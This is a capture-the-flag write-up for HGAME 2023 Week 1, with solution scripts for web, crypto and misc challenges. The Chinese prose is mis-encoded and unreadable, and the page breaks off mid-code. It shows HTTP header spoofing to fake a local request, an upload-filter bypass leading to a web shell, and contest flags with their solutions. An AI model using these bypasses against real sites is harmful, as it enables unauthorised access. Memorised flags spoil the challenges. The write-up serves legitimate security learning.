    
    <content type="html"><![CDATA[<h2 id="week-1"><a class="markdownIt-Anchor" href="#week-1"></a> Week 1</h2><h3 id="sign-in"><a class="markdownIt-Anchor" href="#sign-in"></a> Sign In</h3><p>ç­¾åˆ°é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>flag=<span class="hljs-string">&quot;aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==&quot;</span><br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br><span class="hljs-comment">#b&#x27;hgame&#123;Welcome_To_HGAME2023!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="classic-childhood-game"><a class="markdownIt-Anchor" href="#classic-childhood-game"></a> Classic Childhood Game</h3><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸ªæ¸¸æˆï¼Œå…ˆéšä¾¿ç©ç©</p><p>è¿™ç§é¢˜å°±æ˜¯å‰ç«¯JSï¼Œç©è…»äº†ç›´æ¥çœ‹æºç </p><p>åœ¨æ–‡ä»¶<code>./Res/Events.js</code>æ‹‰åˆ°æœ€ä¸‹é¢æœ‰ä¸€ä¸ªå˜é‡aæ˜¯unicodeç¼–ç </p><p><code>\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35</code></p><p>ç›´æ¥åˆ°Pythonè§£ç </p><img src="/2023/01/05/HGAME/3.png" class=""><h3 id="become-a-member"><a class="markdownIt-Anchor" href="#become-a-member"></a> Become A Member</h3><p>è€ƒå¯ŸHTTPè¯·æ±‚å¤´</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>.è¯·å…ˆæä¾›ä¸€ä¸‹èº«ä»½è¯æ˜ï¼ˆ<span class="hljs-title class_">Cute</span>-<span class="hljs-title class_">Bunny</span>ï¼‰å“¦    <span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span><span class="hljs-symbol">:Cute-Bunny</span><br><span class="hljs-number">2</span>.æ¯ä¸€ä¸ªèƒ½å¤Ÿæˆä¸ºä¼šå‘˜çš„é¡¾å®¢ä»¬éƒ½åº”è¯¥æŒæœ‰åä¸º<span class="hljs-title class_">Vidar</span>çš„é‚€è¯·ç ï¼ˆcodeï¼‰    <span class="hljs-title class_">Cookie</span><span class="hljs-symbol">:code=Vidar</span><br><span class="hljs-number">3</span>.ç”±äºç‰¹æ®ŠåŸå› ï¼Œæˆ‘ä»¬åªæ¥æ”¶æ¥è‡ªäºbunnybunnybunny.comçš„ä¼šå‘˜èµ„æ ¼ç”³è¯·<span class="hljs-symbol">referer:</span>bunnybunnybunny.com<br><span class="hljs-number">4</span>.å°±å·®æœ€åä¸€ä¸ªæœ¬åœ°çš„è¯·æ±‚ï¼Œå°±èƒ½æ‹¿åˆ°ä¼šå‘˜è´¦å·å•¦X-forwarded-<span class="hljs-symbol">for:</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.<span class="hljs-symbol">username:</span>luckytoday <span class="hljs-symbol">password:</span>happy123(è¯·ä»¥jsonè¯·æ±‚æ–¹å¼ç™»é™†)&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;luckytoday&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;happy123&quot;</span></span>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/6.png" class=""><h3 id="guess-who-i-am"><a class="markdownIt-Anchor" href="#guess-who-i-am"></a> Guess Who I Am</h3><p>è¿™ä¸ªé¢˜æ˜¯è¦å†™è„šæœ¬å›ç­”100ä¸ªé—®é¢˜</p><p>æŸ¥çœ‹é¡µé¢æºç ç»™äº†hint: <a href="https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/blob/master/src/scripts/config/member.js</a></p><p>è®¿é—®å¾—åˆ°ç­”æ¡ˆåº“</p><p>æŠŠç­”æ¡ˆè€ƒåˆ°æœ¬åœ°</p><p>æ¥ç€å†™Pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380&quot;</span><br>url1 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getQuestion&quot;</span><br>url2 = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:32380/api/getScore&quot;</span><br>Cookie=<span class="hljs-string">&quot;session=MTY3MjkzNzc4MHxEdi1CQkFFQ180SUFBUkFCRUFBQVBQLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBd0Rfb2c9PXyjkMJVTSpoY_gUdzTPAsOafTVVHnJtDE4aemtvw51VCw==&quot;</span><br><span class="hljs-comment"># resp = requests.get(url)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">110</span>):<br>    resp1 = requests.get(url1,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    resp2 = requests.get(url2,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:Cookie&#125;)<br>    text1 = resp1.text<br>    text1 = text1[text1.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;00&#x27;</span> <span class="hljs-keyword">in</span> text1:<br>        text1=text1[text1.index(<span class="hljs-string">&#x27;\\&#x27;</span>)+<span class="hljs-number">5</span>:] <span class="hljs-comment">#çˆ¬ä¸‹æ¥ç‰¹æ®Šå­—ç¬¦éƒ½æ˜¯unicodeç¼–ç ï¼Œå»æ‰è¿™äº›ç¼–ç ç¬¦ï¼Œåé¢åŒ¹é…å°±è¡Œ</span><br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(text1)</span><br>    <span class="hljs-comment"># print(text2)</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.js&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        line0 = f.readline()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            line1 = f.readline()<br>            <span class="hljs-keyword">if</span> line1:<br>                <span class="hljs-keyword">if</span> text1 <span class="hljs-keyword">in</span> line1:<br>                    answer = line0[line0.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">3</span>:-<span class="hljs-number">3</span>]<br>                    <span class="hljs-comment"># print(answer)</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    line0 = line1<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>    data=&#123;<br>        <span class="hljs-string">&quot;id&quot;</span>:answer<br>    &#125;<br>    <span class="hljs-comment"># print(data)</span><br>    r = requests.post(url=url+<span class="hljs-string">&#x27;/api/verifyAnswer&#x27;</span>,data=data,headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    <span class="hljs-keyword">try</span>:<br>        Cookie=r.headers[<span class="hljs-string">&#x27;set-cookie&#x27;</span>]  <span class="hljs-comment">#æœ‰æ—¶è®¿é—®åæ²¡æœ‰è¿”å›cookieä¼šæŠ¥é”™</span><br>    <span class="hljs-keyword">except</span> KeyError:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-comment"># print(Cookie)</span><br>    <span class="hljs-built_in">print</span>(r.text)<br>    resp2 = requests.get(url2, headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>: Cookie&#125;)<br>    text2 = resp2.text<br>    text2 = text2[text2.index(<span class="hljs-string">&quot;:&quot;</span>) + <span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(text2)<br></code></pre></td></tr></table></figure><p>å›ç­”100æ¬¡åå¾—åˆ°flag:<code>hgame&#123;Guess_who_i_am^Happy_Crawler&#125;</code></p><h3 id="show-me-your-beauty"><a class="markdownIt-Anchor" href="#show-me-your-beauty"></a> Show Me Your Beauty</h3><p>è¿™æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ </p><p>æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°åšäº†å‰ç«¯è¿‡æ»¤ï¼Œä¸è¿‡å‰ç«¯è¿‡æ»¤ç›¸å½“äºæ²¡æœ‰è¿‡æ»¤</p><p>ä¼ ä¸ªç ä¸Šå»ï¼Œå…ˆç”¨åç¼€.jpgï¼Œå†æŠ“åŒ…æ”¹ï¼Œå‘ç°åç«¯ä¹Ÿè¿‡æ»¤äº†ï¼Œè¿™é‡Œå¯ä»¥å¤§å†™ç»•è¿‡</p><img src="/2023/01/05/HGAME/4.png" class=""><p>èšå‰‘è¿æ¥æ‹¿flag</p><h3 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h3><p>æ‹¿åˆ°é™„ä»¶ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n=p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br><span class="hljs-string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>å¸¸è§„RSAé¢˜</p><p><a href="http://www.factordb.com/">åœ¨çº¿ç½‘ç«™</a>å¤§æ•´æ•°åˆ†è§£nå¾—åˆ°p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br>n=<span class="hljs-number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br>p=<span class="hljs-number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span><br>q=<span class="hljs-number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="be-stream"><a class="markdownIt-Anchor" href="#be-stream"></a> Be Stream</h3><p>é¢˜ç›®æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(flag) == <span class="hljs-built_in">bytes</span><br><br>key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">elif</span> i==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (stream(i-<span class="hljs-number">2</span>)*<span class="hljs-number">7</span> + stream(i-<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>)<br><br>enc = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    water = stream((i//<span class="hljs-number">2</span>)**<span class="hljs-number">6</span>) % <span class="hljs-number">256</span><br>    enc += <span class="hljs-built_in">bytes</span>([water ^ flag[i]])<br><br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment"># b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br></code></pre></td></tr></table></figure><p>å¾ªç¯åŠ é€’å½’ï¼Œé‡å¤å¤ªå¤šï¼Œç›´æ¥æŒ‰è¿™ç§å†™æ³•æ˜¯è·‘æ­¥å‡ºæ¥çš„</p><p>ä¿®æ”¹æˆè¿­ä»£ï¼Œæ¯æ¬¡å…ˆmod256</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;Be water&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>), <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-string">b&quot;my friend&quot;</span>, <span class="hljs-string">&#x27;big&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>():<br>    stream = [<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">48</span> // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>)]<br>    stream[<span class="hljs-number">0</span>] = key[<span class="hljs-number">0</span>]<br>    stream[<span class="hljs-number">1</span>] = key[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">24</span> ** <span class="hljs-number">6</span>):<br>        stream[i] = (stream[i - <span class="hljs-number">2</span>] * <span class="hljs-number">7</span> + stream[i - <span class="hljs-number">1</span>] * <span class="hljs-number">4</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> stream<br><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>enc = <span class="hljs-string">b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;</span><br>s = stream()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    water = s[(i // <span class="hljs-number">2</span>) ** <span class="hljs-number">6</span>] % <span class="hljs-number">256</span><br>    <span class="hljs-comment">#print(water)</span><br>    flag += <span class="hljs-built_in">chr</span>(water ^ enc[i])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="ç¥ç§˜çš„ç”µè¯"><a class="markdownIt-Anchor" href="#ç¥ç§˜çš„ç”µè¯"></a> ç¥ç§˜çš„ç”µè¯</h3><p>é™„ä»¶æ˜¯ä¸€ä¸ªmorseéŸ³é¢‘å’Œä¸€ä¸ªåŠ å¯†å¯†æ–‡</p><p>åŠ å¯†å¯†æ–‡ä¸º</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">5</span>Ye<span class="hljs-name">g5</span>Liq<span class="hljs-number">5</span>pif<span class="hljs-number">5</span>pyf<span class="hljs-number">5</span>Ym<span class="hljs-symbol">N77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>pS<span class="hljs-number">25</span>Yiw<span class="hljs-number">5</span>LiA<span class="hljs-number">5</span>Liq<span class="hljs-number">56</span>We<span class="hljs-number">56</span>eY<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>L<span class="hljs-number">2</span><span class="hljs-name">G5</span>piv<span class="hljs-number">6</span>L+Z<span class="hljs-number">5</span>Liq<span class="hljs-number">5</span>raI<span class="hljs-number">5</span>oGv<span class="hljs-number">6</span>KKr<span class="hljs-number">6</span>Ye<span class="hljs-symbol">N6</span>Ye<span class="hljs-symbol">N5</span>Yq<span class="hljs-name">g5</span>a+<span class="hljs-name">G77</span>y<span class="hljs-name">M5</span>oiR<span class="hljs-number">5</span>Lus<span class="hljs-number">5</span>Li<span class="hljs-symbol">N55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">5</span>a<span class="hljs-number">6</span>D<span class="hljs-number">55</span>qE<span class="hljs-number">55</span>yf<span class="hljs-number">5</span>q<span class="hljs-number">2</span>j<span class="hljs-number">5</span>ZCr<span class="hljs-number">5</span>LmJ<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>LuA<span class="hljs-number">5</span>LmI<span class="hljs-number">44</span>CC<span class="hljs-number">5</span>ZSv<span class="hljs-number">5</span>LiA<span class="hljs-number">55</span>+l<span class="hljs-number">6</span>YGT<span class="hljs-number">55</span>qE<span class="hljs-number">5</span>L+h<span class="hljs-number">5</span>oGv<span class="hljs-number">5</span>piv<span class="hljs-number">5</span>YWz<span class="hljs-number">5</span>Lq<span class="hljs-meta">O5</span>a+<span class="hljs-name">G6</span>ZKl<span class="hljs-number">55</span>qE<span class="hljs-number">77</span>ya<span class="hljs-number">4</span>oCc<span class="hljs-number">5</span>Y+q<span class="hljs-number">5</span>pyJ<span class="hljs-number">5</span>YCS<span class="hljs-number">552</span>A<span class="hljs-number">57</span><span class="hljs-number">+76</span>L+H<span class="hljs-number">5</span>Y<span class="hljs-number">2</span>B<span class="hljs-number">5</span>YWr<span class="hljs-number">5</span>bGC<span class="hljs-number">55</span>qE<span class="hljs-number">56</span>+x<span class="hljs-number">56</span>y<span class="hljs-name">G5</span>om<span class="hljs-symbol">N6</span>I<span class="hljs-meta">O95</span>oq<span class="hljs-number">16</span>L<span class="hljs-number">6</span><span class="hljs-number">+5</span>YyX<span class="hljs-number">5</span>qy<span class="hljs-symbol">n56</span>We<span class="hljs-number">6</span>K+d<span class="hljs-number">55</span>qE<span class="hljs-number">57</span>uI<span class="hljs-number">54</span>K<span class="hljs-number">54</span>oCd<span class="hljs-number">44</span>CC<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&quot;5Yeg5Liq5pif5pyf5YmN77yM5oiR5Lus5pS25Yiw5LiA5Liq56We56eY55qE5raI5oGv44CC5L2G5piv6L+Z5Liq5raI5oGv6KKr6YeN6YeN5Yqg5a+G77yM5oiR5Lus5LiN55+l6YGT5a6D55qE55yf5q2j5ZCr5LmJ5piv5LuA5LmI44CC5ZSv5LiA55+l6YGT55qE5L+h5oGv5piv5YWz5LqO5a+G6ZKl55qE77ya4oCc5Y+q5pyJ5YCS552A57+76L+H5Y2B5YWr5bGC55qE56+x56yG5omN6IO95oq16L6+5YyX5qyn56We6K+d55qE57uI54K54oCd44CC&quot;</span><br>a=base64.b64decode(a)<br><span class="hljs-built_in">print</span>(a.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-comment">#å‡ ä¸ªæ˜ŸæœŸå‰ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªç¥ç§˜çš„æ¶ˆæ¯ã€‚ä½†æ˜¯è¿™ä¸ªæ¶ˆæ¯è¢«é‡é‡åŠ å¯†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å®ƒçš„çœŸæ­£å«ä¹‰æ˜¯ä»€ä¹ˆã€‚å”¯ä¸€çŸ¥é“çš„ä¿¡æ¯æ˜¯å…³äºå¯†é’¥çš„ï¼šâ€œåªæœ‰å€’ç€ç¿»è¿‡åå…«å±‚çš„ç¯±ç¬†æ‰èƒ½æŠµè¾¾åŒ—æ¬§ç¥è¯çš„ç»ˆç‚¹â€ã€‚</span><br></code></pre></td></tr></table></figure><p>éŸ³é¢‘ç”¨Auæ‰“å¼€ï¼Œæ‰‹åŠ¨ç¿»è¯‘morseå¯†æ–‡</p><p><code>-----/..---/..---/...--/./..--.-/.--./.-./../../-.../.-../-.--/..--.-/..--.-/..../---/-./.--/.-/..--.-/.---/--/--./..../..--.-/..-./--./-.-/-.-./--.-/.-/---/--.-/-/--/..-./.-.</code></p><p><a href="https://mosimima.hwcha.com/">åœ¨çº¿è§£ç </a> å¹¶è½¬å°å†™<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>â€œå€’ç€ç¿»è¿‡åå…«å±‚ç¯±ç¬†â€åº”è¯¥æ˜¯æ …æ åŠ å¯†ï¼Œä½†æ˜¯æä¸å‡ºæ¥ğŸ˜­~~~</p><p>wpå‡ºæ¥å•¦ï¼Œç»§ç»­è¡¥å……ä¸€ä¸‹</p><p>æ²¡æƒ³åˆ°â€œåŒ—æ¬§ç¥è¯â€å¯¹åº”ç»´å‰å°¼äºšå¯†ç â€¦</p><p>â€œé€†åºâ€-&gt;â€œ18å±‚æ …æ è§£å¯†â€-&gt;â€œå¯†é’¥ä¸ºvidarçš„ç»´å‰å°¼äºšè§£å¯†â€</p><p><code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><h3 id="å…”å…”çš„è½¦ç¥¨"><a class="markdownIt-Anchor" href="#å…”å…”çš„è½¦ç¥¨"></a> å…”å…”çš„è½¦ç¥¨</h3><p>ç”±äºæ²¡æœ‰çœ‹åˆ°é¢˜ç›®çš„æ³¨è§£<code>æ³¨ï¼šflag.pngå·²ç»æå‰ä¿å­˜åœ¨sourceæ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶ä¸”å‘½åä¸ºpicture&#123;x&#125;.png</code></p><p>å¯¼è‡´æ²¡æœ‰æ€è·¯ï¼Œå®˜æ–¹wpå·²ç»å‡ºäº†è¿˜æ˜¯è®°å½•ä¸€ä¸‹åŠ æ·±ç†è§£</p><p>é¢˜â½¬çš„æµç¨‹æ˜¯å…ˆéšæœºâ½£æˆ3å¼ å™ªå£°å›¾â½šä½œä¸ºnonceï¼Œç„¶åæŠŠflag.pngå’Œpicture{xx}.pngæ‰“ä¹±å†ä¸nonce</p><p>è¿›â¾XORã€‚å› ä¸ºåªæœ‰ä¸‰å¼ nonceï¼Œâ½½pictureæœ‰15å¼ ï¼Œæ‰€ä»¥â¼¤æ¦‚ç‡æœ‰pictureè·Ÿflag.pngé‡â½¤äº†åŒâ¼€å¼ </p><p>nonceã€‚å°±å¯ä»¥â½¤è¿™ä¸¤å¼ åŠ å¯†å›¾â½šè¿›â¾XORï¼Œå¾—åˆ°</p><p><em>flag</em>.<em>png</em> âŠ• <em>picturex</em>.<em>png</em></p><img src="/2023/01/05/HGAME/15.png" class=""><p>åŸé¢˜ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> shuffle, randint, getrandbits<br><br>flagImg = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>width = flagImg.width  <span class="hljs-comment">#379</span><br>height = flagImg.height <span class="hljs-comment">#234</span><br><br><span 